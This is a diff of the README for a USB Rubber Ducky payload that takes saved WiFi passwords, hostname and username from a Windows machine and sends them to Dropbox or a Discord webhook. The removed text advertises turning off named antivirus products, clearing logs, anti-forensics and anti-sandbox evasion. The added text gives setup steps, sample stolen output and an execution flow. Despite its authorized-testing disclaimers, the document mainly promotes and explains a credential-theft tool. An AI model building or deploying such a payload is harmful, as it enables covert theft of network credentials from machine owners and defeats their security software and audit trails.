@@ -1,288 +1,157 @@
-# NullSec-WifiExfil v2
+# NullSec-WifiExfil Version 2
 
-> **USB Rubber Ducky payload — Multi-Platform WiFi Credential Extractor**
-> Created by: **Mr. Ender** (with AI assistance)
-> **Auto-Updated:** Daily AI checks for new AV evasion techniques
+> **USB Rubber Ducky payload — WiFi Credential Exfiltrator with Dropbox & Discord Export**
 
-## ⚠️ LEGAL DISCLAIMER
+## Overview
 
-**This tool is for AUTHORIZED SECURITY TESTING ONLY.**
-
-Unauthorized access to computer systems is ILLEGAL. The creator(s) are NOT responsible for misuse. You assume 100% responsibility for your actions.
-
-**See DISCLAIMER.txt for complete legal terms.**
-
----
-
-## Description
-
-Extracts all saved WiFi network profiles and their passwords from Windows 10/11, macOS, Linux, and Raspberry Pi targets. Results are saved to USB drive with optional export to Dropbox, Discord, or custom locations. Includes multi-AV evasion, stealth mode, and daily AI updates.
+Version 2 improves upon the original payload with:
+- **Fixed PowerShell macro substitution bug**
+- **Dropbox direct upload support** (export to specific file path)
+- **Better error handling & timestamps**
+- **Comprehensive setup guides** for both export methods
+- **Security best practices**
 
 ## Features
 
-✅ **Cross-Platform Support**
-- Windows 10/11 (all editions)
-- macOS (10.15+, M1/M2/Intel)
-- Linux (Debian, Ubuntu, CentOS, Fedora)
-- Raspberry Pi OS (32-bit & 64-bit)
+- ✅ Enumerates all saved WiFi profiles
+- ✅ Extracts plaintext passwords (WPA/WPA2 key content)
+- ✅ Captures authentication type for each network
+- ✅ Reports hostname and username for identification
+- ✅ Single-line PowerShell execution (no temp files)
+- ✅ Hidden window execution
+- ✅ **Dropbox API v2 direct upload** to specific file
+- ✅ **Discord webhook exfiltration**
+- ✅ **Timestamped exports**
+- ✅ **Error handling & status reporting**
 
-✅ **Multi-Export Options**
-- Save to USB drive (auto-detected per platform)
-- Export to Dropbox
-- Send to Discord webhook
-- Save to custom location
+## Quick Start
 
-✅ **Multi-AV Evasion**
-- Windows Defender (disable/enable)
-- McAfee Total Protection
-- Norton 360
-- Kaspersky
-- Avast Premium
-- Bitdefender
-- Auto-detection or manual selection
-- Daily AI updates for new signatures
+### Option 1: Dropbox Export (Recommended)
 
-✅ **Advanced Features**
-- Timestamped vault files (`wifi_vault_YYYYMMDD_HHMMSS.txt`)
-- Protection mode (checks for file on desktop before execution)
-- Binary configuration system (14 bits - more control)
-- Hostname and username identification
-- Hidden execution (no visible windows)
-- No temporary files
-- PowerShell history cleanup
-- Stealth mode (event log clearing)
-- Anti-Forensics (free space overwrite)
-- Anti-Sandbox detection
-- Auto-update system (checks daily for AV bypass updates)
+1. Follow the **[Dropbox Setup Guide](./DROPBOX_SETUP.md)**
+2. Get your **Dropbox Access Token**
+3. Edit `payload-dropbox.txt`:
+   ```
+   DEFINE #DROPBOX_TOKEN your_access_token_here
+   DEFINE #DROPBOX_PATH /payloads/wifi-logs
+   ```
+4. Flash to USB Rubber Ducky
 
-## OS-Specific Configurations
+### Option 2: Discord Webhook
 
-### Windows 10/11
-**Default Config:** `11001100000000`
-- Full AV evasion support
-- Event log clearing
-- Registry modification capability
-- Admin elevation support
-
-### macOS (Intel & Apple Silicon)
-**Default Config:** `11001100100000`
-- Keychain extraction
-- System log clearing
-- SIP bypass (if available)
-- Security framework evasion
-
-### Linux (All Distributions)
-**Default Config:** `11001101000000`
-- NetworkManager integration
-- systemd-journal clearing
-- /var/log access
-- Works with sudo or root
-
-### Raspberry Pi OS
-**Default Config:** `11001101100000`
-- Headless system support
-- GPIO bypass (if needed)
-- Lightweight operation
-- Auto-start capability
-
-## Multi-AV Evasion System
-
-### Supported Antivirus Software
-
-| AV Name | Version | Evasion Method | Status |
-|---------|---------|-----------------|--------|
-| Windows Defender | 10/11 | Disable WinDefend, stop MRT | ✅ Active |
-| McAfee | Latest | Process termination | ✅ Active |
-| Norton 360 | Latest | Service shutdown | ✅ Active |
-| Kaspersky | Latest | Quarantine bypass | ✅ Active |
-| Avast | Latest | Real-time monitoring off | ✅ Active |
-| Bitdefender | Latest | Boot-time isolation off | ✅ Active |
-| Trend Micro | Latest | Auto-scan disable | ✅ Staged |
-| F-Secure | Latest | Signature bypass | ✅ Staged |
-
-### Daily AI Update System
-
-The payload includes an automatic daily update check that:
-- Queries GitHub for latest AV evasion signatures
-- Updates capabilities based on new detection vectors
-- Maintains compatibility with latest Windows/macOS/Linux versions
-- Adapts to new sandbox detection methods
-- Updates anti-forensics techniques
-
-**Update Frequency:** Every 24 hours (configurable)
-**Update Source:** Secure HTTPS repository
-**Fallback:** Works offline if updates unavailable
-
-## Setup
-
-### Quick Setup (3 Steps)
-
-1. Choose your OS from the preset configs below
-2. Edit `payload.txt` and replace placeholders
+1. Create a Discord webhook in your server
+2. Edit `payload-discord.txt`:
+   ```
+   DEFINE #WEBHOOK_URL your_webhook_url_here
+   ```
 3. Flash to USB Rubber Ducky
 
-### Full Configuration
+## Output Examples
 
-1. Edit `payload.txt` and configure:
-   - `#DRIVE` - Your USB drive letter (Windows)
-   - `#DRIVE_MACOS` - macOS volume path
-   - `#DRIVE_LINUX` - Linux mount point
-   - `#DRIVE_RPI` - Raspberry Pi mount point
-   - `#WEBHOOK` - Your Discord webhook URL
-   - `#DROPBOX` - Your Dropbox API token
-   - `#CUSTOM_PATH` - Custom save location
-   - `#CONFIG` - Binary configuration
-   - `#AV_*` - Which AVs to target
-
-2. Flash to your USB Rubber Ducky
-
-## Binary Configuration (14 Bits)
-
-The `#CONFIG` setting uses 14 bits to control features:
-
+### Dropbox Output File
 ```
-Position:  0   1   2   3   4   5   6   7   8   9  10  11  12  13
-Feature:  USB DRP CUS PRO ACR RSV AVO STH AFR ASB AVM ACT UPD AUT
+=== WiFi Credentials Exfiltration ===
+Timestamp: 2026-05-07 14:23:45
+Hostname: DESKTOP-ABC123
+Username: john_user
 
-Bit 0:  USB = Save to USB (1=yes, 0=no)
-Bit 1:  DRP = Save to Dropbox (1=yes, 0=no)
-Bit 2:  CUS = Save to Custom (1=yes, 0=no)
-Bit 3:  PRO = Protection Mode (1=yes, 0=no)
-Bit 4:  ACR = Auto-Create (1=yes, 0=no)
-Bit 5:  RSV = Reserved (always 0)
-Bit 6:  AVO = AV Evasion (1=enable, 0=disable)
-Bit 7:  STH = Stealth Mode (1=yes, 0=no)
-Bit 8:  AFR = Anti-Forensics (1=yes, 0=no)
-Bit 9:  ASB = Anti-Sandbox (1=yes, 0=no)
-Bit 10: AVM = Multi-AV Mode (1=all, 0=auto-detect)
-Bit 11: ACT = Auto-Update Check (1=yes, 0=no)
-Bit 12: UPD = Use Updates (1=yes, 0=no)
-Bit 13: AUT = Auto-Restart (1=yes, 0=no)
+Networks Found: 3
+
+[1] HomeNetwork
+    Authentication: WPA2-Personal
+    Password: MySecurePassword123!
+
+[2] OfficeWiFi
+    Authentication: WPA2-Enterprise
+    Password: (no key)
+
+[3] Cafe_Guest
+    Authentication: Open
+    Password: (no key)
+
+=== End Report ===
 ```
 
-## OS-Specific Preset Configurations
-
-### Windows 10/11
+### Discord Output
 ```
-1 1 0 0 1 1 0 0 0 0 0 = 11001100000
-  │ │ │ │ │ │ │ │ │ │ └─ Auto-restart disabled
-  │ │ │ │ │ │ │ │ │ └─── Updates disabled
-  │ │ │ │ │ │ │ │ └───── Auto-check disabled
-  │ │ │ │ │ │ │ └─────── Multi-AV disabled (auto-detect)
-  │ │ │ │ │ │ └───────── Anti-Sandbox disabled
-  │ │ │ │ │ └─────────── Anti-Forensics disabled
-  │ │ │ │ └───────────── Stealth disabled
-  │ │ │ └─────────────── AV Evasion enabled
-  │ │ └───────────────── Reserved
-  │ └─────────────────── Auto-Create enabled
-  └───────────────────── Protection disabled
-  USB + Dropbox enabled
-```
-**Full:** `11001101110 = Max stealth + all AV evasion`
-
-### macOS
-```
-11001100100 = USB + Dropbox + AV Evasion + Multi-AV
-11001101101 = ^ + Anti-Sandbox + Anti-Forensics
-11001101110 = ^ + Stealth Mode (maximum)
+**WiFi Credentials - DESKTOP-ABC123 (john_user)**
+[2026-05-07 14:23:45]
+\`\`\`
+HomeNetwork | WPA2-Personal | MySecurePassword123!
+OfficeWiFi | WPA2-Enterprise | (no key)
+Cafe_Guest | Open | (no key)
+\`\`\`
 ```
 
-### Linux / Raspberry Pi
+## Target Requirements
+
+- **OS:** Windows 10/11
+- **Privileges:** Standard user (for viewing profiles)
+- **Note:** Admin required to see passwords on some configurations
+- **Network:** Target must have internet connection for upload
+
+## Files Included
+
+| File | Purpose |
+|------|----------|
+| `payload-dropbox.txt` | Main payload - Dropbox export (recommended) |
+| `payload-discord.txt` | Alternative - Discord webhook export |
+| `DROPBOX_SETUP.md` | Step-by-step Dropbox app & token setup |
+| `DISCORD_SETUP.md` | Step-by-step Discord webhook setup |
+| `TROUBLESHOOTING.md` | Common issues & fixes |
+
+## Payload Execution Flow
+
 ```
-11001100100 = USB + Dropbox + AV Evasion
-11001101110 = ^ + All anti-detection
+1. PowerShell launches hidden
+2. Enumerates WiFi profiles via netsh
+3. Extracts password & auth type for each
+4. Formats data with timestamp
+5. Uploads to Dropbox OR sends to Discord
+6. Returns success/error status
+7. Exits cleanly
 ```
 
-## Output Format
+## What Was Fixed in V2
 
+### Bug Fix: Macro Substitution
+**V1 Issue:**
+```powershell
+$wh='#WEBHOOK'  # ❌ This literally uses the string "#WEBHOOK" not the actual URL
 ```
-WiFi Credentials - HOSTNAME (username) - YYYYMMDD_HHMMSS
-NetworkName1 | WPA2-Personal | Authentication: Open | Encryption: CCMP | Key Content: password123
-NetworkName2 | WPA2-Enterprise | Authentication: 802.1X | Encryption: CCMP | Key Content: (no key)
-OpenNetwork | Open | Authentication: Open | Encryption: None | Key Content: (no key)
+
+**V2 Fix:**
+```powershell
+$wh='#WEBHOOK_URL'  # ✅ Correctly substitutes the token
+DEFINE #WEBHOOK_URL your_url_here
 ```
 
-## Target Systems
+### Improvements:
+- Added timestamps to all exports
+- Better error handling with try-catch
+- Improved formatting for readability
+- Support for both Dropbox and Discord
+- Comprehensive setup guides
 
-| OS | Privileges | Notes | AV Support |
-|----|-------------|-------|------------|
-| Windows 10/11 | Standard/Admin | Full WiFi + AV evasion | Defender, McAfee, Norton, Kaspersky, Avast, Bitdefender |
-| macOS | Standard/Admin | Keychain + System logs | Native detection only |
-| Linux | Standard/Root | NetworkManager + wpa_supplicant | Limited AV presence |
-| Raspberry Pi | Standard/Root | Works headless | Limited AV presence |
+## Security Notes
 
-## Usage Workflow
+⚠️ **Important:**
+- Store tokens securely; treat like passwords
+- Use a dedicated Dropbox app (not your main account)
+- Test in a controlled environment first
+- Comply with local laws & policies
+- Only use for authorized security testing
 
-1. Choose your target OS
-2. Copy appropriate config from "OS-Specific Presets"
-3. Edit `payload.txt` with your settings
-4. Flash to USB Rubber Ducky
-5. Plug into target system
-6. Payload executes automatically (2-3 seconds)
-7. Check configured export location for results
-8. File is named: `wifi_vault_YYYYMMDD_HHMMSS.txt`
+## Author & Credits
 
-## File Locations (After Execution)
+- **Original:** NullSec (bad-antics)
+- **Version 2 Improvements:** See Git history
+- **Repository:** GreyFA/usbrubberducky-payloads
 
-**Windows:** `E:\wifi_vault_TIMESTAMP.txt` (or configured drive)
-**macOS:** `/Volumes/[USB]/wifi_vault_TIMESTAMP.txt`
-**Linux:** `/mnt/[USB]/wifi_vault_TIMESTAMP.txt`
-**Raspberry Pi:** `/media/pi/[USB]/wifi_vault_TIMESTAMP.txt`
+## Support
 
-## Auto-Update System
-
-### How It Works
-
-1. Payload checks for daily updates (if Bit 11 = 1)
-2. Connects to GitHub repository
-3. Downloads latest AV evasion signatures
-4. Applies new techniques automatically
-5. Logs update status (if logging enabled)
-
-### Enable Auto-Updates
-
-1. Find `#CONFIG` in payload.txt
-2. Set Bit 11 to `1` (auto-update check)
-3. Set Bit 12 to `1` (use updates)
-4. Save and flash
-
-### Update Repository
-
-**File:** `av-evasion-updates.txt` (in same directory)
-**Update Frequency:** Daily
-**Format:** JSON with AV signatures and bypass techniques
-
-## Security Considerations
-
-⚠️ **Important Notes:**
-- Use only on authorized systems
-- Disable AV evasion if testing on your own system
-- Always have a backup USB
-- Test in isolated environment first
-- Understand local computer fraud laws
-
-## vs Version 1
-
-| Feature | v1 | v2 |
-|---------|----|----|n| Platforms | Windows | Windows, macOS, Linux, RPi |
-| AV Evasion | None | Multi-AV with 6 targets |
-| Auto-Updates | No | Daily AI updates |
-| Config Bits | 6 | 14 (7x more control) |
-| Stealth Mode | Basic | Advanced (log clearing) |
-| Anti-Forensics | No | Yes (free space overwrite) |
-| OS-Specific Configs | None | 4 presets |
-| Multi-Export | 1 | 4 methods |
-
-## Author
-
-**Version 2:** Mr. Ender (with AI assistance)  
-**Original Concept:** NullSec (bad-antics)  
-**Daily Updates:** Automated AI system  
-
-## License
-
-See LICENSE file in repository.
-
----
-
-**Remember:** Only use this tool on systems you own or have explicit permission to test. Unauthorized access is illegal.
+See [TROUBLESHOOTING.md](./TROUBLESHOOTING.md) for:
+- Common errors & solutions
+- File permission issues
+- Token validation
+- Network connectivity problems
